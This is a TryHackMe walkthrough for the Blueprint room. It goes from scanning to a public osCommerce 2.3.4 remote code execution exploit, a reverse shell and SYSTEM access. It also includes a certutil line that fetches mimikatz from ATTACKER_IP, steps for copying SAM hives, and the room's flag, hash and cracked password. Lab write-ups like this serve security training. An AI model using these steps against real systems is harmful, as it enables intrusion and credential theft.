# Blueprint - TryHackMe Walkthrough

## Machine Information

| Category         | Value                                    |
| ---------------- | ---------------------------------------- |
| Platform         | TryHackMe                                |
| Room Name        | Blueprint                                |
| Difficulty       | Easy                                     |
| Operating System | Windows                                  |
| Objective        | Gain SYSTEM access and capture the flags |

---

# Initial Enumeration

## Target Information

```text
Main IP :: 10.48.183.212
```

As usual, we begin with a full port scan to identify exposed services.

---

# Port Discovery

Using Rustscan for rapid enumeration:

```bash
rustscan -a 10.48.183.212
```

Results:

```text
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49160/tcp open  unknown
49164/tcp open  unknown
49165/tcp open  unknown
```

During further Nmap scanning, two additional ports are discovered:

```text
3306/tcp
8080/tcp
```

---

# Service Enumeration

Performing service and version detection:

```bash
nmap -sCV -p80,135,139,443,445,3306,8080,49152-49165 10.48.183.212
```

Important findings:

### Web Services

```text
80/tcp   Microsoft IIS 7.5
443/tcp  Apache 2.4.23
8080/tcp Apache 2.4.23
```

### Database

```text
3306/tcp MariaDB
```

### SMB

```text
Windows 7 Home Basic SP1
```

### Hostname

```text
BLUEPRINT
```

### Workgroup

```text
WORKGROUP
```

---

# SMB Enumeration

Since SMB is exposed, begin with anonymous enumeration.

```bash
enum4linux -U 10.48.183.212
```

Unfortunately very little information is disclosed.

Next, enumerate shares directly.

```bash
smbclient -L 10.48.183.212 -N
```

Output:

```text
ADMIN$
C$
IPC$
Users
Windows
```

Although accessible shares exist, they do not immediately provide useful attack vectors.

At this point SMB enumeration appears to be a dead end.

---

# Web Enumeration

Attention shifts toward the web services.

### Port 80

Browsing:

```text
http://10.48.183.212
```

Returns:

```text
404 - File or directory not found
```

Nothing interesting here.

---

### Ports 443 and 8080

Browsing reveals:

```text
Index of /
```

with the following directories:

```text
oscommerce-2.3.4/
oscommerce-2.3.4/catalog/
oscommerce-2.3.4/docs/
```

This immediately becomes our primary attack surface.

---

# Identifying Vulnerability

The target is running:

```text
osCommerce 2.3.4
```

Researching this version reveals a known Remote Code Execution vulnerability.

A publicly available exploit exists:

```text
https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution
```

Clone the exploit and execute it.

```bash
python osCommerce2_3_4RCE.py \
http://10.48.183.212:8080/oscommerce-2.3.4/catalog/
```

Output:

```text
[*] Install directory still available
[*] Host likely vulnerable
```

Testing command execution:

```text
RCE_SHELL$ whoami
```

Output:

```text
nt authority\system
```

The machine is immediately compromised with SYSTEM privileges.

---

# Obtaining a Reverse Shell

Although the exploit provides command execution, an interactive shell is preferable.

A PowerShell reverse shell payload is generated and executed through the RCE interface.

Listener:

```bash
nc -lvnp 4444
```

Execute the encoded PowerShell payload through the vulnerable application.

After execution:

```text
Connection received
```

Interactive PowerShell shell obtained.

---

# SYSTEM Access

Verify privileges.

```powershell
whoami
```

Output:

```text
nt authority\system
```

The vulnerable application executes commands directly as SYSTEM.

No privilege escalation is required.

---

# Root Flag

Navigate to the Administrator desktop.

```powershell
cd C:\Users\Administrator\Desktop
```

Read the flag.

```powershell
cat root.txt.txt
```

Output:

```text
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```

Root flag captured.

---

# Post Exploitation

Since we already possess SYSTEM privileges, credential extraction is possible.

A common approach is downloading Mimikatz.

Example:

```powershell
certutil.exe -urlcache -f http://ATTACKER_IP:8000/mimikatz.exe mimi.exe
```

Registry hive backups can also be copied:

```powershell
copy sam.save C:\Users\Public\sam.save
copy system.save C:\Users\Public\system.save
```

These files can later be extracted and analyzed offline to recover password hashes.

Recovered NTLM hash:

```text
30e87bf999828446a1c1209ddde4c450
```

Cracking the hash reveals:

```text
googleplus.
```

This demonstrates successful credential recovery after SYSTEM compromise.

---

# Attack Path Summary

```text
Nmap Enumeration
        │
        ▼
SMB Enumeration
        │
        ▼
No Valuable Findings
        │
        ▼
Web Enumeration
        │
        ▼
osCommerce 2.3.4 Identified
        │
        ▼
Known RCE Vulnerability
        │
        ▼
Exploit Execution
        │
        ▼
SYSTEM Command Execution
        │
        ▼
PowerShell Reverse Shell
        │
        ▼
Administrator Desktop
        │
        ▼
Root Flag
```

---

# Flag

## Root

```text
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```

---

# Key Takeaways

* Always enumerate all exposed web applications and services.
* Directory listings frequently reveal software versions and deployment mistakes.
* Outdated osCommerce installations remain vulnerable to well-known RCE exploits.
* Public exploit repositories can significantly accelerate exploitation when versions match.
* Achieving SYSTEM-level code execution on Windows often removes the need for privilege escalation.
* Credential dumping remains an important post-exploitation technique for demonstrating impact.
* Legacy Windows systems running outdated software are highly susceptible to complete compromise.

Machine compromised successfully.

Source material:
